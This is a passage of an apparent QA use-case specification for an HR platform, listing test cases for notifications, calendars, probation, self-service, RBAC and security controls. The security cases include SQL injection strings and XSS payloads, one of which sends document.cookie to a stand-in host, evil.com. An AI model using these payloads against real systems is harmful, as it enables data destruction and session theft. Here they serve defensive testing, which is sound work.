  1. Open notification panel; 5 unread notifications; badge shows "5"
  2. Click "Mark All Read"; badge disappears; all notifications show as read
  3. Click individual notification; navigates to relevant page; that notification marked read
- **Expected Result:** Read state persists; badge count updates in real-time via WebSocket
- **Negative Test:** Mark read for another user's notification → HTTP 403
- **Verification:** `GET /api/v1/notifications?unread=true` returns 0 after mark-all-read

### UC-NOTIF-005 — Notification Badge Count (WebSocket)

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** ws://localhost:8080/ws (WebSocket)
- **API Endpoint:** WebSocket STOMP topic `/user/{id}/notifications`
- **Test Steps:**
  1. Employee has app open; HR approves leave in another session
  2. Notification badge increments from 2 to 3 without page refresh
  3. Open bell icon; new notification listed at top
- **Expected Result:** Real-time badge update via WebSocket push; no polling required
- **Negative Test:** WebSocket disconnected; notification still created in DB; badge syncs on
  reconnect
- **Verification:** WebSocket frame received with notification payload; badge count matches DB count

### UC-NOTIF-006 — Multi-Channel Notification (In-App + Email)

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** N/A
- **API Endpoint:** Kafka topic: nu-aura.notifications
- **Test Steps:**
  1. Submit expense claim; verify: in-app notification "Expense submitted", email confirmation sent
  2. Manager approves; verify employee gets both in-app + email for approval
- **Expected Result:** Both channels triggered for the same event; no channel duplication within
  channel
- **Negative Test:** Kafka consumer offline; notification queued; delivered when consumer restarts
- **Verification:** Check both notification table and email log for same event_id; both show
  DELIVERED

---

## Announcements — Use Cases

### UC-ANNC-001 — Create Company Announcement

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** HR_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000/announcements/new
- **API Endpoint:** POST /api/v1/announcements
- **Test Steps:**
  1. Create announcement "Office Closed Dec 25 — Christmas Holiday"; rich text with image
  2. Set audience: "All Employees"; publish immediately
  3. All employees see announcement on dashboard
- **Expected Result:** Announcement visible on dashboard; Kafka event published; push notification
  sent
- **Negative Test:** Employee tries to create announcement → HTTP 403
- **Verification:** `GET /api/v1/announcements?status=PUBLISHED` returns new announcement

### UC-ANNC-002 — Targeted Announcement (Department/Role)

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/announcements/new
- **API Endpoint:** POST /api/v1/announcements
- **Test Steps:**
  1. Create announcement targeting only "Engineering" department
  2. Verify Engineering employees see it; Sales employees do NOT see it
- **Expected Result:** Audience filtering works; non-targeted employees have no access to
  announcement
- **Negative Test:** Engineering employee directly accesses announcement URL intended for Sales
  only → 404 or empty
- **Verification:** `GET /api/v1/announcements?departmentId={eng_id}` returns announcement; Sales
  query does not

### UC-ANNC-003 — Pin/Unpin Announcement

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/announcements
- **API Endpoint:** PUT /api/v1/announcements/{id}/pin
- **Test Steps:**
  1. Pin important announcement; verify it appears at top of all employees' dashboards
  2. Unpin; verify it reverts to chronological position
- **Expected Result:** Pinned announcement always shown at top; unpin restores order
- **Negative Test:** Pin more than 3 announcements (limit) → "Maximum 3 pinned announcements
  allowed"
- **Verification:** `GET /api/v1/announcements?pinned=true` returns correct pinned items

### UC-ANNC-004 — Dismiss Announcement

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000
- **API Endpoint:** POST /api/v1/announcements/{id}/dismiss
- **Test Steps:**
  1. Employee dismisses non-critical announcement by clicking "×"
  2. Announcement removed from their dashboard view
  3. Announcement still visible to other employees
- **Expected Result:** Per-user dismiss; dismissed state persists across sessions; announcement
  still exists for others
- **Negative Test:** Dismiss pinned announcement → dismissal not allowed for pinned announcements
- **Verification:** `GET /api/v1/announcements?dismissed=false` excludes dismissed; per-user filter
  works

---

## Calendar — Use Cases

### UC-CAL-001 — Leave and Holiday Overlay

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/calendar
- **API Endpoint:** GET /api/v1/calendar
- **Test Steps:**
  1. Open calendar view; see personal leaves (green), team leaves (blue), holidays (orange)
  2. Public holiday "Republic Day Jan 26" shown; click for details
  3. Leave applied by self shows as confirmed or pending
- **Expected Result:** All event types overlaid correctly; color-coded; clickable for detail
- **Negative Test:** Calendar shows leave from another team (no visibility) → filtered by team
  membership
- **Verification:** Calendar events match leave records + holiday configuration in DB

### UC-CAL-002 — Create Calendar Event

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Manager
- **URL:** http://localhost:3000/calendar/new
- **API Endpoint:** POST /api/v1/calendar/events
- **Test Steps:**
  1. Create team event "Sprint Planning"; invite team members; set recurrence weekly
  2. Team members receive calendar notification; event appears on their calendars
- **Expected Result:** Event created; invites sent; recurrence works; event blocks the timeslot
- **Negative Test:** Create event overlapping another event without override → conflict warning
  shown
- **Verification:** `GET /api/v1/calendar/events?userId={id}&range=week` returns newly created event

### UC-CAL-003 — Team Leave Visibility

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Manager
- **URL:** http://localhost:3000/calendar?view=team
- **API Endpoint:** GET /api/v1/calendar/team
- **Test Steps:**
  1. Manager views team calendar; see all team members' leave on one view
  2. Hover over leave entry to see employee name, leave type, duration
  3. Plan team event avoiding dates with 3+ people on leave
- **Expected Result:** Team leave visible to manager; employee leave details visible; individual
  names shown
- **Negative Test:** Employee views other team's leaves → only own team visible
- **Verification:** `GET /api/v1/calendar/team?managerId={id}` returns only direct reports' leave

### UC-CAL-004 — Holiday Calendar Markers

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** All roles
- **URL:** http://localhost:3000/calendar
- **API Endpoint:** GET /api/v1/holidays?year=2026
- **Test Steps:**
  1. Open calendar for January 2026; Republic Day (Jan 26) shown as holiday marker
  2. Hover shows "Republic Day — National Holiday — Office Closed"
  3. Leave application auto-blocks holiday selection
- **Expected Result:** All configured holidays marked; national + restricted holidays
  differentiated; block leave on holidays
- **Negative Test:** Apply leave that spans only holidays → "Selected dates are all public holidays"
- **Verification:** Holiday markers match `holidays` table entries for the tenant

### UC-CAL-005 — One-on-One Meeting Scheduling

- **Priority:** P2
- **Sub-App:** NU-Grow
- **Persona:** Manager
- **URL:** http://localhost:3000/performance/1on1s/schedule
- **API Endpoint:** POST /api/v1/one-on-ones
- **Test Steps:**
  1. Manager schedules 1:1 with team member: date, duration 30 min, agenda
  2. Employee receives calendar invite; confirms attendance
  3. 1:1 notes stored; linked to performance record
- **Expected Result:** 1:1 event on both calendars; notification sent; notes captured post-meeting
- **Negative Test:** Schedule 1:1 on employee's approved leave day → "Employee is on approved leave
  on this date"
- **Verification:** `GET /api/v1/one-on-ones?employeeId={id}` returns scheduled 1:1 with agenda

---

## Probation — Expanded Use Cases

### UC-PROB-002 — Probation Extension

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/probation
- **API Endpoint:** POST /api/v1/probation/{id}/extend
- **Playwright Spec:** `frontend/e2e/probation.spec.ts`
- **Test Steps:**
  1. Employee's 90-day probation ending in 7 days; HR initiates extension
  2. New end date = +30 days; reason = "Performance improvement needed"
  3. Employee and manager notified; extension event logged
- **Expected Result:** Probation extended; new end date set; employee status remains PROBATION;
  audit entry created
- **Negative Test:** Extend already-confirmed employee → "Cannot extend probation for confirmed
  employee"
- **Verification:** `GET /api/v1/employees/{id}` →
  `probationEndDate: extended_date, extensionCount: 1`

### UC-PROB-003 — Probation Confirmation

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/probation/confirm
- **API Endpoint:** POST /api/v1/probation/{id}/confirm
- **Test Steps:**
  1. Employee's 90-day probation ends; HR initiates confirmation
  2. Manager completes probation review form; rates performance
  3. HR_ADMIN confirms; employee status changes PROBATION → CONFIRMED
  4. Confirmation letter generated; salary revision triggered (if applicable)
- **Expected Result:** Status updated; confirmation letter sent; employee access to full benefits
  unlocked
- **Negative Test:** Confirm without completed manager review → "Manager probation review is
  required before confirmation"
- **Verification:** `GET /api/v1/employees/{id}` → `status: CONFIRMED, confirmedAt: timestamp`

### UC-PROB-004 — Probation Termination

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/offboard
- **API Endpoint:** POST /api/v1/probation/{id}/terminate
- **Test Steps:**
  1. HR decides not to confirm employee during probation; initiates termination
  2. Reason = "Performance not meeting expectations"; notice period = same day
  3. Offboarding checklist triggered; access revoked; FnF generated
- **Expected Result:** Employment terminated; offboarding initiated; final settlement calculated
  with probation-specific rules
- **Negative Test:** Terminate confirmed employee via probation termination endpoint → 400 "Employee
  is not on probation"
- **Verification:** `GET /api/v1/employees/{id}` →
  `status: TERMINATED, terminationReason: PROBATION_FAILURE`

### UC-PROB-005 — HR Probation Dashboard

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/probation/dashboard
- **API Endpoint:** GET /api/v1/probation/dashboard
- **Test Steps:**
  1. View probation dashboard: ending this month (5), ending next month (8), overdue (2)
  2. Click on "Ending This Month" to see employee list with days remaining
  3. Bulk send reminder to managers for pending reviews
- **Expected Result:** Accurate counts; drill-down works; bulk reminder sent to relevant managers
- **Negative Test:** Employee accesses probation dashboard → HTTP 403
- **Verification:** Dashboard counts match employees with `status=PROBATION` grouped by date range

---

## My Space — Expanded Use Cases

### UC-MY-002 — Payslips History View

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/payslips
- **API Endpoint:** GET /api/v1/payslips/my
- **Test Steps:**
  1. Employee views payslips list: last 12 months; sort by date descending
  2. Click on any month; see full breakdown: earnings, deductions, net pay
  3. Verify all components: Basic, HRA, DA, PF deduction, ESI, PT, TDS
- **Expected Result:** All payslips listed; correct breakdown; no payslips from before joining date
- **Negative Test:** Employee tries to access another employee's payslip ID → HTTP 403
- **Verification:** `GET /api/v1/payslips/my` returns only logged-in employee's payslips with
  correct amounts

### UC-MY-003 — Payslip PDF Download

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/payslips/{id}
- **API Endpoint:** GET /api/v1/payslips/{id}/download
- **Test Steps:**
  1. Click "Download PDF" on any payslip
  2. PDF contains: company letterhead, employee details, salary components, net pay, month/year
  3. Verify PDF is not corrupt; can be opened; salary figures match web view
- **Expected Result:** PDF downloaded; all required fields present; OpenPDF format correct
- **Negative Test:** Download payslip for future month (not yet processed) → "Payslip not available
  yet"
- **Verification:** PDF file size > 20KB (not empty); text extraction shows correct amounts

### UC-MY-004 — Leave Balance Self-Service

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/leave-balance
- **API Endpoint:** GET /api/v1/leave-balances/my
- **Test Steps:**
  1. View leave balances: Earned Leave (12.5 remaining), Casual Leave (3 remaining), Sick Leave (4
     remaining)
  2. See used days, pending approvals, lapsed (if any)
  3. Balance should update immediately after leave approval
- **Expected Result:** All leave type balances shown; accurate counts; pending deduction visible
  as "held"
- **Negative Test:** View leave balance for leave type that doesn't apply to employee's grade → not
  shown
- **Verification:** `GET /api/v1/leave-balances/my` matches DB records exactly

### UC-MY-005 — Attendance History

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/attendance
- **API Endpoint:** GET /api/v1/attendance/my
- **Test Steps:**
  1. View current month attendance calendar: present (green), absent (red), leave (blue), holiday (
     orange)
  2. Click on specific day to see check-in/check-out times
  3. View total present days, absent days, late arrivals for the month
- **Expected Result:** Calendar matches actual attendance records; no data from other employees
  shown
- **Negative Test:** Employee views attendance for next month → no future data shown
- **Verification:** `GET /api/v1/attendance/my?month=current` returns correct daily records

### UC-MY-006 — My Assets View

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/assets
- **API Endpoint:** GET /api/v1/assets/my
- **Test Steps:**
  1. View assigned assets: laptop (Dell XPS, SN: 12345), monitor, keyboard
  2. Click asset to see details: category, handover date, condition
  3. Report asset issue via "Report Damage" button
- **Expected Result:** Only assets assigned to logged-in employee shown; correct details; damage
  report created
- **Negative Test:** Employee sees asset assigned to different employee → HTTP 403
- **Verification:** `GET /api/v1/assets/my` returns only assets with
  `assignedTo = logged-in-user-id`

### UC-MY-007 — Loan Status View

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/loans
- **API Endpoint:** GET /api/v1/loans/my
- **Test Steps:**
  1. View active loan: outstanding ₹35,000; EMI ₹5,000; next deduction date = Oct 28
  2. View repayment schedule: 7 paid (✓), 5 remaining; click each to see payment date
  3. View closed loans history
- **Expected Result:** Accurate outstanding balance; next deduction date correct; schedule fully
  shown
- **Negative Test:** Employee with no loans → "No active loans" empty state with "Apply for Loan"
  CTA
- **Verification:** Outstanding balance = principal − sum of paid EMIs

### UC-MY-008 — Profile Self-Update

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/profile
- **API Endpoint:** PUT /api/v1/employees/me
- **Test Steps:**
  1. Employee updates personal details: emergency contact phone, personal email, address
  2. Sensitive fields (bank account, PAN) require HR approval to change
  3. Profile photo update works; name/DOB changes blocked for self-service
- **Expected Result:** Allowed fields updated immediately; restricted fields sent for HR approval;
  change history logged
- **Negative Test:** Employee tries to update own designation/salary via profile → HTTP 403 on those
  fields
- **Verification:** `GET /api/v1/employees/me` shows updated emergency contact; salary unchanged

---

## Settings & Security — Expanded Use Cases

### UC-SETTINGS-002 — Change Password

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/security/password
- **API Endpoint:** POST /api/v1/auth/change-password
- **Playwright Spec:** `frontend/e2e/settings-security.spec.ts`
- **Test Steps:**
  1. Enter current password; new password "NewPass@2026!"; confirm match
  2. System validates: 12+ chars, uppercase, lowercase, digit, special char
  3. Verify password history check: cannot reuse last 5 passwords
- **Expected Result:** Password changed; JWT invalidated; re-login required; previous sessions
  revoked
- **Negative Test:** Reuse password from history → "Cannot reuse any of your last 5 passwords"
- **Verification:** Old JWT no longer valid; forced re-login; `POST /api/v1/auth/change-password`
  returns 200

### UC-SETTINGS-003 — Multi-Factor Authentication Setup

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/security/mfa
- **API Endpoint:** POST /api/v1/auth/mfa/setup
- **Test Steps:**
  1. Enable TOTP MFA; scan QR code with authenticator app
  2. Enter 6-digit TOTP code to confirm setup
  3. Log out; log back in; prompted for TOTP code after password
- **Expected Result:** MFA enabled; 2nd factor required on every login; backup codes provided
- **Negative Test:** Enter wrong TOTP code 5 times → "Too many failed MFA attempts — try again in 15
  minutes"
- **Verification:** `GET /api/v1/auth/mfa/status` returns `{mfaEnabled: true, method: TOTP}`

### UC-SETTINGS-004 — Revoke Active Sessions

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/security/sessions
- **API Endpoint:** DELETE /api/v1/auth/sessions/{sessionId}
- **Test Steps:**
  1. Employee sees active sessions: current (Chrome/Mac), previous (Firefox/Windows 2 days ago)
  2. Click "Revoke" on Firefox session; that session's JWT added to blacklist
  3. Try accessing API with old JWT → HTTP 401
- **Expected Result:** Session revoked; JWT blacklisted via Redis; other sessions unaffected
- **Negative Test:** Revoke current session → "Cannot revoke current session — use logout instead"
- **Verification:** `GET /api/v1/auth/sessions` no longer shows revoked session; Redis blacklist
  contains old JWT

### UC-SETTINGS-005 — Notification Preference by Type

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/notifications
- **API Endpoint:** PUT /api/v1/notification-preferences
- **Test Steps:**
  1. Toggle off email for "Attendance Reminders"; keep in-app on
  2. Toggle off all for "System Maintenance" notices
  3. Verify mandatory types (password reset, security alerts) cannot be turned off
- **Expected Result:** Per-type per-channel preferences saved; mandatory types protected from
  disable
- **Negative Test:** Try to disable security alert notifications → toggle disabled with tooltip "
  Required for security"
- **Verification:** `GET /api/v1/notification-preferences` reflects saved settings per type and
  channel

### UC-SETTINGS-006 — Google SSO View and Management

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/security/sso
- **API Endpoint:** GET /api/v1/auth/sso/connections
- **Test Steps:**
  1. View connected Google account for SSO; shows email and connection date
  2. Disconnect Google SSO (if password login also set up)
  3. Reconnect via Google OAuth flow
- **Expected Result:** SSO connection manageable; fallback to password required before SSO
  disconnect
- **Negative Test:** Disconnect Google SSO with no password set → "Set a password before
  disconnecting SSO"
- **Verification:** `GET /api/v1/auth/sso/connections` returns connection status

### UC-SETTINGS-007 — Profile Settings (Display Preferences)

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** http://localhost:3000/settings/profile
- **API Endpoint:** PUT /api/v1/employees/me/preferences
- **Test Steps:**
  1. Change display language (if multi-lang supported) or date format (DD/MM/YYYY vs MM/DD/YYYY)
  2. Toggle dark mode; preference persisted to DB (not just localStorage)
  3. Change timezone for personal view (different from org timezone)
- **Expected Result:** Display preferences saved; applied across sessions; dates shown in preferred
  format
- **Negative Test:** Set invalid timezone string → "Invalid timezone"
- **Verification:** `GET /api/v1/employees/me/preferences` returns saved preferences

---

## RBAC — Expanded Use Cases

### UC-RBAC-005 — HR_MANAGER Cannot Access Payroll Configuration

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_MANAGER
- **URL:** http://localhost:3000/settings/payroll
- **API Endpoint:** PUT /api/v1/settings/payroll
- **Test Steps:**
  1. Log in as HR_MANAGER; navigate to /settings/payroll
  2. Page should not be in sidebar; direct URL should redirect to "Access Denied"
  3. API call `PUT /api/v1/settings/payroll` → HTTP 403
- **Expected Result:** HR_MANAGER has read-only access to payroll; no configuration access
- **Verification:** HTTP 403 from API; sidebar does not include payroll settings link

### UC-RBAC-006 — TENANT_ADMIN Cannot Access Super Admin Tenant Management

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** TENANT_ADMIN
- **URL:** http://localhost:3000/admin/tenants
- **API Endpoint:** GET /api/v1/admin/tenants
- **Test Steps:**
  1. Log in as TENANT_ADMIN; attempt to access /admin/tenants (SUPER_ADMIN only)
  2. All data is scoped to their own tenant; cannot see or modify other tenants
- **Expected Result:** TENANT_ADMIN sees only own tenant data; cross-tenant access blocked at API
  level
- **Verification:** `GET /api/v1/admin/tenants` returns only own tenant; 403 for cross-tenant
  queries

### UC-RBAC-007 — Self-Approval Blocked Across All Modules

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/approvals
- **API Endpoint:** POST /api/v1/approvals/{id}/approve
- **Test Steps:**
  1. HR_ADMIN submits their own leave request
  2. Workflow assigns HR_ADMIN as approver (due to role)
  3. HR_ADMIN attempts to approve their own leave → blocked
  4. Escalated to next approver in chain
- **Expected Result:** Self-approval detected and blocked; escalation triggered automatically
- **Verification:** `POST /api/v1/approvals/{id}/approve` with self → HTTP 422 "Self-approval not
  permitted"

### UC-RBAC-008 — Sidebar Link Isolation by Role

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Employee, Manager, HR_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000
- **API Endpoint:** GET /api/v1/auth/me/permissions (used to derive sidebar state)
- **Test Steps:**
  1. Log in as Employee: verify sidebar shows ONLY My Space, Calendar, Directory
  2. Log in as Manager: additionally sees Team section (leave approvals, timesheets)
  3. Log in as HR_ADMIN: sees full HRMS menu (payroll, all employees, reports)
  4. Log in as TENANT_ADMIN: sees platform settings, billing, tenant config
- **Expected Result:** Each role sees exactly the sidebar links they are authorized for; no extras
- **Verification:** DOM inspection shows correct nav items per role; no hidden links accessible via
  URL

### UC-RBAC-009 — API Permission Boundary Enforcement

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** N/A (API direct)
- **API Endpoint:** GET /api/v1/employees (all employees list)
- **Test Steps:**
  1. Employee JWT used to call `GET /api/v1/employees` (requires employee.read permission)
  2. Employee JWT used to call `GET /api/v1/payroll/runs` (requires payroll.read permission)
  3. Employee JWT used to call `POST /api/v1/employees` (requires employee.create permission)
- **Expected Result:** All three return HTTP 403; no data leakage in response body
- **Verification:** Response body =
  `{status: 403, error: "Forbidden", message: "Insufficient permissions"}`

### UC-RBAC-010 — Permission Cache Invalidation After Role Change

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** HR_ADMIN (granting) → Employee (receiving promotion)
- **URL:** http://localhost:3000/employees/{id}/roles
- **API Endpoint:** PUT /api/v1/employees/{id}/roles
- **Test Steps:**
  1. Employee promoted from EMPLOYEE to HR_MANAGER role
  2. Redis permission cache for that user invalidated immediately
  3. Employee refreshes page; sidebar now shows HR_MANAGER menu items
  4. API calls with updated JWT return correct authorization
- **Expected Result:** Cache invalidated within seconds; no stale permission data; new role
  effective immediately
- **Verification:** `GET /api/v1/auth/me/permissions` shows updated permission set after role change

### UC-RBAC-011 — Permission Delegation (Temporary Access)

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** HR_ADMIN → Manager
- **URL:** http://localhost:3000/settings/delegation
- **API Endpoint:** POST /api/v1/permissions/delegate
- **Test Steps:**
  1. HR_ADMIN delegates "leave.approve" to Manager A for 2 weeks (manager going on vacation)
  2. Manager A can now approve leave for HR_ADMIN's reports during delegation period
  3. After 2 weeks, delegation auto-expires; Manager A loses the permission
- **Expected Result:** Delegated permission active within date range; auto-expired by scheduled job
- **Negative Test:** Delegate permission you don't have yourself → "Cannot delegate permission you
  don't possess"
- **Verification:** `GET /api/v1/permissions/delegate?userId={manager}` shows active delegation with
  expiry date

### UC-RBAC-012 — MY SPACE Routes Have No Permission Check

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** Employee (any authenticated user)
- **URL:** http://localhost:3000/my-space/*
- **API Endpoint:** GET /api/v1/employees/me/*
- **Test Steps:**
  1. Employee (role=EMPLOYEE, no extra permissions) accesses My Space routes
  2. /my-space/payslips, /my-space/leave-balance, /my-space/attendance, /my-space/assets all load
  3. No "Access Denied"; no permission required for self-service routes
- **Expected Result:** All My Space routes accessible to any authenticated employee
- **Verification:** EMPLOYEE role can access all /my-space/* routes; API /me/* endpoints return 200

### UC-RBAC-013 — Expired JWT Rejected

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Any
- **URL:** N/A (API)
- **API Endpoint:** Any authenticated endpoint
- **Test Steps:**
  1. Wait for JWT to expire (or manually expire via Redis TTL manipulation)
  2. Make API call with expired JWT in cookie
  3. Verify redirect to login page; error = "Session expired"
- **Expected Result:** HTTP 401; cookie cleared; redirect to /login; no data returned
- **Verification:** Response = `{status: 401, error: "Unauthorized", message: "Token expired"}`

### UC-RBAC-014 — SUPER_ADMIN Bypasses All Permission Checks

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** SUPER_ADMIN
- **URL:** All routes
- **API Endpoint:** All endpoints
- **Test Steps:**
  1. Log in as SUPER_ADMIN; access any route (payroll, employee management, tenant admin)
  2. No permission denied; all CRUD operations available
  3. Verify `@RequiresPermission` annotations bypassed for SUPER_ADMIN role
- **Expected Result:** SUPER_ADMIN accesses everything without explicit permission assignment
- **Verification:** SUPER_ADMIN JWT with role=SUPER_ADMIN gets 200 on all tested endpoints

### UC-RBAC-015 — HR_ADMIN Cannot See Payroll for Other Tenants

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** HR_ADMIN
- **URL:** N/A (API)
- **API Endpoint:** GET /api/v1/payroll/runs
- **Test Steps:**
  1. HR_ADMIN of Tenant A calls `GET /api/v1/payroll/runs`
  2. Only Tenant A's payroll runs returned; Tenant B's data never included
- **Expected Result:** Multi-tenant isolation enforced; `tenant_id` filter applied to all queries
- **Verification:** All returned records have `tenant_id = logged-in-user-tenant-id`; cross-tenant
  query returns 0 results

### UC-RBAC-016 — New Joiner Role Restrictions

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** NEW_JOINER
- **URL:** http://localhost:3000/my-space
- **API Endpoint:** GET /api/v1/employees/me
- **Test Steps:**
  1. Log in as NEW_JOINER (pre-onboarding); limited sidebar shown
  2. Can access preboarding checklist, upload documents, view offer letter
  3. Cannot access main HRMS modules (payroll, leave requests, attendance)
- **Expected Result:** NEW_JOINER role gates all standard modules; only preboarding UI accessible
- **Verification:** Sidebar shows only preboarding items; standard module APIs return 403

### UC-RBAC-017 — Manager Cannot Approve Own Team Member's Expense with Self-Conflict

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Manager
- **URL:** http://localhost:3000/approvals/expenses
- **API Endpoint:** POST /api/v1/approvals/{id}/approve
- **Test Steps:**
  1. Manager submitted expense; same manager is approver for their reportee's expense
  2. Manager can approve team member's expense (no conflict)
  3. Manager CANNOT approve their own expense
- **Expected Result:** Manager approves team's expenses; self-approval remains blocked
- **Verification:** Cross-check: manager ID ≠ expense submitter ID enforced at API level

### UC-RBAC-018 — Role Hierarchy Enforcement (Cannot Grant Higher Role)

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/roles
- **API Endpoint:** PUT /api/v1/employees/{id}/roles
- **Test Steps:**
  1. HR_ADMIN (level 85) tries to assign TENANT_ADMIN role (level 90) to another employee
  2. System blocks this operation
- **Expected Result:** You cannot assign a role with higher level than your own; 403 returned
- **Verification:** `PUT /api/v1/employees/{id}/roles` with higher-level role → HTTP 403 "
  Insufficient authority to grant this role"

### UC-RBAC-019 — HR_MANAGER Scoped to Own Department

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_MANAGER
- **URL:** http://localhost:3000/employees
- **API Endpoint:** GET /api/v1/employees
- **Test Steps:**
  1. HR_MANAGER logs in; views employee list
  2. Only sees employees in departments they manage (not company-wide)
  3. Attempts to approve leave for employee in another department → 403
- **Expected Result:** HR_MANAGER actions scoped to managed departments; cross-dept blocked
- **Verification:** Employee list API filtered by `managedDepartmentIds` for HR_MANAGER role

### UC-RBAC-020 — Audit: Permission Check Failures Logged

- **Priority:** P2
- **Sub-App:** Platform
- **Persona:** Any
- **URL:** N/A
- **API Endpoint:** Any
- **Test Steps:**
  1. Employee calls `GET /api/v1/payroll/runs` → 403
  2. Audit log shows: user_id, endpoint, HTTP method, timestamp, permission_required, result=DENIED
  3. Multiple denials from same user in short window triggers alert
- **Expected Result:** Every permission denial logged to audit topic (Kafka: nu-aura.audit);
  suspicious patterns alertable
- **Verification:** `GET /api/v1/audit-logs?action=PERMISSION_DENIED&userId={id}` returns the failed
  attempt

---

## Security — Expanded Use Cases

### UC-SEC-006 — CSRF Protection Verification

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Attacker simulation
- **URL:** N/A
- **API Endpoint:** POST /api/v1/employees (state-changing endpoint)
- **Test Steps:**
  1. Make POST request without CSRF double-submit cookie → HTTP 403 "CSRF token mismatch"
  2. Make POST request with correct CSRF token → HTTP 200/201
  3. Verify CSRF token rotates after each state-changing request
- **Expected Result:** Stateful POST/PUT/DELETE requires valid CSRF token; GET requests allowed
  without
- **Verification:** Missing X-XSRF-TOKEN header on POST → 403; header present → request proceeds

### UC-SEC-007 — SQL Injection Prevention

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Security tester
- **URL:** http://localhost:3000/employees?search=
- **API Endpoint:** GET /api/v1/employees?search={injection}
- **Test Steps:**
  1. Search with payload: `'; DROP TABLE employees; --`
  2. Search with: `' OR '1'='1`
  3. Search with: `<script>alert('xss')</script>`
- **Expected Result:** All inputs sanitized via JPA parameterized queries; no SQL executed; error or
  empty results
- **Negative Test:** All three payloads above must be safe
- **Verification:** DB table still intact; response = 200 with empty/safe results; no error stack
  trace exposed

### UC-SEC-008 — XSS Prevention in Rich Text Fields

- **Priority:** P0
- **Sub-App:** NU-Fluence / Announcements / Helpdesk
- **Persona:** Security tester
- **URL:** http://localhost:3000/announcements/new
- **API Endpoint:** POST /api/v1/announcements
- **Test Steps:**
  1. Submit announcement with body: `<img src=x onerror=alert('xss')>`
  2. Submit with: `<script>document.location='evil.com/?c='+document.cookie</script>`
  3. View submitted announcement; scripts must NOT execute
- **Expected Result:** HTML sanitized by Tiptap/DOMPurify before storage and rendering; scripts
  stripped
- **Verification:** Stored content has no `<script>` tags; displayed content shows no alert; network
  tab shows no redirect

### UC-SEC-009 — Export Rate Limiting

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Any authenticated user
- **URL:** http://localhost:3000/reports
- **API Endpoint:** GET /api/v1/reports/{type}/export
- **Test Steps:**
  1. Export 5 reports in sequence within 5 minutes → all succeed
  2. Attempt 6th export → HTTP 429 "Export rate limit exceeded — 5 per 5 minutes"
  3. Wait 5 minutes; export again → succeeds
- **Expected Result:** Rate limit enforced via Redis Bucket4j; window resets after 5 minutes
- **Verification:** `X-RateLimit-Remaining` header decrements with each export; 429 on 6th attempt

### UC-SEC-010 — Sensitive Data Not Exposed in API Response

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** Employee
- **URL:** N/A
- **API Endpoint:** GET /api/v1/employees/{id}
- **Test Steps:**
  1. Call `GET /api/v1/employees/{id}` for any employee
  2. Verify response does NOT contain: `password`, `passwordHash`, `jwtSecret`, `internalNotes`
  3. Bank account number shown as masked (e.g., `XXXX1234`)
